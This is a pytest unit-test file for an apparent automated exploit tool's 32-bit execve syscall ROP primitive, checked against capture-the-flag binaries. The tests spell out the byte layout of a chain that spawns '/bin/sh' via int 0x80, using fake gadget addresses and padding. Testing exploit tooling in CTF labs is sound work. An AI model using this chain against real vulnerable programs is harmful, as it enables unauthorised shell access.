"""Unit tests for ``autopwn.primitives.execve_syscall`` (P6.5).

Per ``rebuild.md`` §6.7 P6.9 + §6.7 P6.5: every primitive needs
``build_payload(ctx) -> bytes`` asserted against a fake
address.  P6.5 has 1 primitive (``ExecveSyscallX32``) with
two payload-shape variants (combined ``pop ecx; pop ebx``
gadget vs separate ``pop ecx`` + ``pop ebx`` gadgets).

Payload sizes (per v3.1 ``_legacy.py`` L1869-1935):
  * Combined (``pop_ecx == 0``, ``pop_ecx_ebx != 0``):
    8 little-endian u32 emitted after padding
    (pop_eax, 0xB, pop_ecx_ebx, 0, binsh, pop_edx, 0, int_0x80)
    → ``padding + 32`` bytes
  * Separate (``pop_ecx != 0``):
    9 little-endian u32 emitted after padding
    (pop_eax, 0xB, pop_ebx, binsh, pop_ecx, 0, pop_edx, 0, int_0x80)
    → ``padding + 36`` bytes

Test plan
---------
* :class:`ExecveSyscallX32`:
    * ``name`` + ``stage_count()`` = 1 (single-stage — no leak)
    * Combined variant: ``pop_ecx == 0`` + ``pop_ecx_ebx != 0``
        - payload length = ``padding + 32`` (8 p32)
        - payload contains: pop_eax, 0xB, pop_ecx_ebx, 0, /bin/sh, pop_edx, 0, int_0x80
    * Separate variant: ``pop_ecx != 0``
        - payload length = ``padding + 36`` (9 p32)
        - payload contains: pop_eax, 0xB, pop_ebx, /bin/sh, pop_ecx, 0, pop_edx, 0, int_0x80
    * Edge cases:
        * x64 binary → ``b""`` (no x64 variant)
        * ``gadgets_x32 is None`` → ``b""``
        * ``has_eax_ebx_ecx_edx is False`` → ``b""``
        * ``int_0x80 == 0`` → ``b""``
        * Combined + ``pop_ecx_ebx == 0`` → ``b""`` (no combined gadget)
        * Separate + ``pop_ebx == 0`` → ``b""`` (missing pop_ebx)
        * No ``/bin/sh`` in binary → ``b""`` (use canary which lacks /bin/sh)
    * Real binary smoke: ``fmtstr1`` (32-bit, has /bin/sh)
"""
from __future__ import annotations

import struct

import pytest

from tests.conftest import ctx_for


pytestmark = pytest.mark.primitive


# Fake x32 gadget addresses used throughout.  Picked to be
# visually distinct in hex dumps (0xE0*, 0xE1*, ...).
_FAKE_POP_EAX     = 0xE0000001
_FAKE_POP_EBX     = 0xE0000002
_FAKE_POP_ECX     = 0xE0000003
_FAKE_POP_EDX     = 0xE0000004
_FAKE_POP_ECX_EBX = 0xE0000005
_FAKE_RET         = 0xE0000006
_FAKE_INT_0x80    = 0xE0000007


def _gadgets_x32_combined():
    """Return a :class:`RopGadgetsX32` in the **combined**-variant shape.

    Combined variant is selected when ``pop_ecx == 0`` AND
    ``pop_ecx_ebx != 0`` (v3.1 ``_legacy.py`` L1875 condition).
    """
    from autopwn.context import RopGadgetsX32
    return RopGadgetsX32(
        pop_eax=_FAKE_POP_EAX,
        pop_ebx=_FAKE_POP_EBX,
        pop_ecx=0,                # forces combined branch
        pop_edx=_FAKE_POP_EDX,
        pop_ecx_ebx=_FAKE_POP_ECX_EBX,  # non-zero
        ret=_FAKE_RET,
        int_0x80=_FAKE_INT_0x80,
        has_eax_ebx_ecx_edx=True,
    )


def _gadgets_x32_separate():
    """Return a :class:`RopGadgetsX32` in the **separate**-variant shape.

    Separate variant is selected when ``pop_ecx != 0`` (and
    ``pop_ebx != 0``).
    """
    from autopwn.context import RopGadgetsX32
    return RopGadgetsX32(
        pop_eax=_FAKE_POP_EAX,
        pop_ebx=_FAKE_POP_EBX,
        pop_ecx=_FAKE_POP_ECX,    # non-zero → separate branch
        pop_edx=_FAKE_POP_EDX,
        pop_ecx_ebx=0,            # not used in separate variant
        ret=_FAKE_RET,
        int_0x80=_FAKE_INT_0x80,
        has_eax_ebx_ecx_edx=True,
    )


class TestExecveSyscallX32Metadata:
    """Class-level invariants for the primitive."""

    def test_name_is_canonical(self):
        from autopwn.primitives.execve_syscall import ExecveSyscallX32

        assert ExecveSyscallX32.name == "execve-syscall-x32"

    def test_stage_count_is_one(self):
        """execve syscall is single-stage — it directly calls the
        kernel via ``int 0x80`` with controlled registers; no leak
        or second-stage required (unlike ret2libc)."""
        from autopwn.primitives.execve_syscall import ExecveSyscallX32

        assert ExecveSyscallX32().stage_count() == 1

    def test_subclass_of_exploit_primitive(self):
        from autopwn.primitives.base import ExploitPrimitive
        from autopwn.primitives.execve_syscall import ExecveSyscallX32

        assert issubclass(ExecveSyscallX32, ExploitPrimitive)

    def test_re_exported_from_primitives_package(self):
        """``autopwn.primitives`` re-exports :class:`ExecveSyscallX32`."""
        from autopwn.primitives import ExecveSyscallX32 as ReExported
        from autopwn.primitives.execve_syscall import ExecveSyscallX32 as FromModule

        assert ReExported is FromModule


class TestExecveSyscallX32CombinedVariant:
    """``pop_ecx == 0`` + ``pop_ecx_ebx != 0`` → combined-gadget payload."""

    def test_payload_length_is_padding_plus_32(self, challenge_dir):
        """Combined: 8 p32 (32 bytes) appended to padding.

        Mirrors v3.1 ``_legacy.py`` L225:
        ``flat([nop*padding, pop_eax, 0xb, pop_ecx_ebx, 0, binsh, pop_edx, 0, int_0x80])``
        — that's 1 NOP-sled + 8 values = 9 flat() args, but the
        NOPs collapse to ``padding`` so the post-padding length
        is 8 p32 = 32.
        """
        from autopwn.primitives.execve_syscall import ExecveSyscallX32

        # fmtstr1 is 32-bit + has /bin/sh → real binary smoke.
        # padding value is irrelevant (we use 80 like v3.1 baseline).
        ctx = ctx_for("fmtstr1", bit=32)
        ctx.padding = 80
        ctx.gadgets_x32 = _gadgets_x32_combined()
        payload = ExecveSyscallX32().build_payload(ctx)
        # padding + 8 * 4 = 80 + 32 = 112
        assert len(payload) == 80 + 32
        # First 80 bytes are the padding
        assert payload[:80] == b"A" * 80

    def test_payload_contains_expected_layout(self, challenge_dir):
        """Bytes 80-112 unpack to (pop_eax, 0xB, pop_ecx_ebx, 0, binsh, pop_edx, 0, int_0x80)."""
        from pwn import ELF

        from autopwn.primitives.execve_syscall import ExecveSyscallX32

        ctx = ctx_for("fmtstr1", bit=32)
        ctx.padding = 8
        ctx.gadgets_x32 = _gadgets_x32_combined()
        payload = ExecveSyscallX32().build_payload(ctx)
        # padding + 8 p32 → unpack 8 u32
        pop_eax, syscall_no, pop_ecx_ebx, zero1, binsh, pop_edx, zero2, int_0x80 = (
            struct.unpack("<8I", payload[8:40])
        )
        expected_binsh = next(ELF(str(ctx.binary.path), checksec=False).search(b"/bin/sh"))
        assert pop_eax == _FAKE_POP_EAX
        assert syscall_no == 0xB           # SYSCALL_EXECVE
        assert pop_ecx_ebx == _FAKE_POP_ECX_EBX
        assert zero1 == 0                  # argv=NULL
        assert binsh == expected_binsh
        assert binsh != 0                  # /bin/sh found
        assert pop_edx == _FAKE_POP_EDX
        assert zero2 == 0                  # envp=NULL
        assert int_0x80 == _FAKE_INT_0x80


class TestExecveSyscallX32SeparateVariant:
    """``pop_ecx != 0`` → separate ``pop ecx`` + ``pop ebx`` payload."""

    def test_payload_length_is_padding_plus_36(self, challenge_dir):
        """Separate: 9 p32 (36 bytes) appended to padding.

        Mirrors v3.1 ``_legacy.py`` L240:
        ``flat([nop*padding, pop_eax, 0xb, pop_ebx, binsh, pop_ecx, 0, pop_edx, 0, int_0x80])``
        — 1 NOP-sled + 9 values = 10 flat() args; NOPs collapse
        to padding, so post-padding length is 9 p32 = 36.
        """
        from autopwn.primitives.execve_syscall import ExecveSyscallX32

        ctx = ctx_for("fmtstr1", bit=32)
        ctx.padding = 80
        ctx.gadgets_x32 = _gadgets_x32_separate()
        payload = ExecveSyscallX32().build_payload(ctx)
        # padding + 9 * 4 = 80 + 36 = 116
        assert len(payload) == 80 + 36
        assert payload[:80] == b"A" * 80

    def test_payload_contains_expected_layout(self, challenge_dir):
        """Bytes 80-116 unpack to (pop_eax, 0xB, pop_ebx, binsh, pop_ecx, 0, pop_edx, 0, int_0x80)."""
        from pwn import ELF

        from autopwn.primitives.execve_syscall import ExecveSyscallX32

        ctx = ctx_for("fmtstr1", bit=32)
        ctx.padding = 8
        ctx.gadgets_x32 = _gadgets_x32_separate()
        payload = ExecveSyscallX32().build_payload(ctx)
        pop_eax, syscall_no, pop_ebx, binsh, pop_ecx, zero1, pop_edx, zero2, int_0x80 = (
            struct.unpack("<9I", payload[8:44])
        )
        expected_binsh = next(ELF(str(ctx.binary.path), checksec=False).search(b"/bin/sh"))
        assert pop_eax == _FAKE_POP_EAX
        assert syscall_no == 0xB
        assert pop_ebx == _FAKE_POP_EBX
        assert binsh == expected_binsh
        assert pop_ecx == _FAKE_POP_ECX
        assert zero1 == 0                  # argv=NULL
        assert pop_edx == _FAKE_POP_EDX
        assert zero2 == 0                  # envp=NULL
        assert int_0x80 == _FAKE_INT_0x80

    def test_padding_bytes_are_unchanged(self, challenge_dir):
        """Padding is the leading bytes — verify it's not been touched."""
        from autopwn.primitives.execve_syscall import ExecveSyscallX32

        ctx = ctx_for("fmtstr1", bit=32)
        ctx.padding = 200
        ctx.gadgets_x32 = _gadgets_x32_separate()
        payload = ExecveSyscallX32().build_payload(ctx)
        assert payload[:200] == b"A" * 200


class TestExecveSyscallX32EdgeCases:
    """All ``b""``-returning branches."""

    def test_returns_empty_for_x64_binary(self, challenge_dir):
        """x64 has a different syscall ABI; primitive is x32-only."""
        from autopwn.primitives.execve_syscall import ExecveSyscallX32

        # level3_x64 is the only x64 binary in Challenge/
        ctx = ctx_for("level3_x64", bit=64)
        ctx.padding = 80
        ctx.gadgets_x32 = _gadgets_x32_combined()
        payload = ExecveSyscallX32().build_payload(ctx)
        assert payload == b""

    def test_returns_empty_when_gadgets_x32_is_none(self, challenge_dir):
        """No ROP gadgets resolved yet → primitive stays silent."""
        from autopwn.primitives.execve_syscall import ExecveSyscallX32

        ctx = ctx_for("fmtstr1", bit=32)
        ctx.padding = 80
        ctx.gadgets_x32 = None
        payload = ExecveSyscallX32().build_payload(ctx)
        assert payload == b""

    def test_returns_empty_when_has_eax_ebx_ecx_edx_is_false(self, challenge_dir):
        """The aggregate ``has_eax_ebx_ecx_edx`` gate is the first check."""
        from autopwn.context import RopGadgetsX32
        from autopwn.primitives.execve_syscall import ExecveSyscallX32

        ctx = ctx_for("fmtstr1", bit=32)
        ctx.padding = 80
        ctx.gadgets_x32 = RopGadgetsX32(
            pop_eax=_FAKE_POP_EAX, pop_ebx=_FAKE_POP_EBX,
            pop_ecx=0, pop_edx=_FAKE_POP_EDX,
            pop_ecx_ebx=_FAKE_POP_ECX_EBX, ret=_FAKE_RET,
            int_0x80=_FAKE_INT_0x80,
            has_eax_ebx_ecx_edx=False,   # gate off
        )
        payload = ExecveSyscallX32().build_payload(ctx)
        assert payload == b""

    def test_returns_empty_when_int_0x80_is_zero(self, challenge_dir):
        """No ``int 0x80`` gadget → can't invoke the syscall."""
        from autopwn.context import RopGadgetsX32
        from autopwn.primitives.execve_syscall import ExecveSyscallX32

        ctx = ctx_for("fmtstr1", bit=32)
        ctx.padding = 80
        ctx.gadgets_x32 = RopGadgetsX32(
            pop_eax=_FAKE_POP_EAX, pop_ebx=_FAKE_POP_EBX,
            pop_ecx=0, pop_edx=_FAKE_POP_EDX,
            pop_ecx_ebx=_FAKE_POP_ECX_EBX, ret=_FAKE_RET,
            int_0x80=0,                  # missing syscall gadget
            has_eax_ebx_ecx_edx=True,
        )
        payload = ExecveSyscallX32().build_payload(ctx)
        assert payload == b""

    def test_returns_empty_for_combined_with_no_pop_ecx_ebx(self, challenge_dir):
        """Combined branch needs ``pop_ecx_ebx`` non-zero; if also 0, bail."""
        from autopwn.context import RopGadgetsX32
        from autopwn.primitives.execve_syscall import ExecveSyscallX32

        ctx = ctx_for("fmtstr1", bit=32)
        ctx.padding = 80
        ctx.gadgets_x32 = RopGadgetsX32(
            pop_eax=_FAKE_POP_EAX, pop_ebx=_FAKE_POP_EBX,
            pop_ecx=0,                   # combined branch
            pop_edx=_FAKE_POP_EDX,
            pop_ecx_ebx=0,               # missing combined gadget
            ret=_FAKE_RET, int_0x80=_FAKE_INT_0x80,
            has_eax_ebx_ecx_edx=True,
        )
        payload = ExecveSyscallX32().build_payload(ctx)
        assert payload == b""

    def test_returns_empty_for_separate_with_no_pop_ebx(self, challenge_dir):
        """Separate branch needs both ``pop_ecx`` and ``pop_ebx`` non-zero."""
        from autopwn.context import RopGadgetsX32
        from autopwn.primitives.execve_syscall import ExecveSyscallX32

        ctx = ctx_for("fmtstr1", bit=32)
        ctx.padding = 80
        ctx.gadgets_x32 = RopGadgetsX32(
            pop_eax=_FAKE_POP_EAX, pop_ebx=0,    # missing pop_ebx
            pop_ecx=_FAKE_POP_ECX, pop_edx=_FAKE_POP_EDX,
            pop_ecx_ebx=0, ret=_FAKE_RET,
            int_0x80=_FAKE_INT_0x80,
            has_eax_ebx_ecx_edx=True,
        )
        payload = ExecveSyscallX32().build_payload(ctx)
        assert payload == b""

    def test_returns_empty_when_no_binsh_in_binary(self, challenge_dir):
        """canary is 32-bit but doesn't carry ``/bin/sh`` in the binary."""
        from autopwn.primitives.execve_syscall import ExecveSyscallX32

        # canary is 32-bit; flag stack_canary=True to match its profile
        ctx = ctx_for("canary", bit=32, stack_canary=True)
        ctx.padding = 80
        ctx.gadgets_x32 = _gadgets_x32_combined()
        payload = ExecveSyscallX32().build_payload(ctx)
        assert payload == b""


class TestExecveSyscallX32RealBinarySmoke:
    """End-to-end smoke against the only 32-bit Challenge/ binary with ``/bin/sh``."""

    def test_fmtstr1_emits_nonempty_payload_with_combined_gadgets(self, challenge_dir):
        """fmtstr1 + combined-gadget context → real ``int 0x80`` payload.

        fmtstr1 is 32-bit, dynamically linked, and embeds
        ``/bin/sh`` at 0x80486f3 — so it satisfies every
        pre-condition of :class:`ExecveSyscallX32` *except* the
        ROP-gadget resolution (which is a P4.4 recon concern, not
        the primitive's).  The fake gadgets supplied here prove
        the payload layout is correct end-to-end.
        """
        from autopwn.primitives.execve_syscall import ExecveSyscallX32

        ctx = ctx_for("fmtstr1", bit=32)
        ctx.padding = 80
        ctx.gadgets_x32 = _gadgets_x32_combined()
        payload = ExecveSyscallX32().build_payload(ctx)
        # 80 padding + 32 (8 p32) = 112
        assert len(payload) == 112
        # /bin/sh address from the real binary is in the 0x0804xxxx range.
        # Combined layout: padding(80) + pop_eax(4) + 0xB(4) + pop_ecx_ebx(4)
        #                  + 0(4) + binsh(4) = binsh at offset 96.
        binsh = struct.unpack("<I", payload[96:100])[0]
        assert 0x08040000 <= binsh <= 0x0805FFFF, (
            f"binsh address {hex(binsh)} not in 32-bit .rodata range"
        )
        # Combined layout after 80-byte padding:
        #   [80-84] pop_eax, [84-88] 0xB (SYSCALL_EXECVE), [88-92] pop_ecx_ebx,
        #   [92-96] 0, [96-100] binsh, [100-104] pop_edx, [104-108] 0, [108-112] int_0x80
        syscall_no = struct.unpack("<I", payload[84:88])[0]
        assert syscall_no == 0xB
        # int_0x80 gadget is at the very tail of the payload (offset 108-112)
        tail = struct.unpack("<I", payload[108:112])[0]
        assert tail == _FAKE_INT_0x80
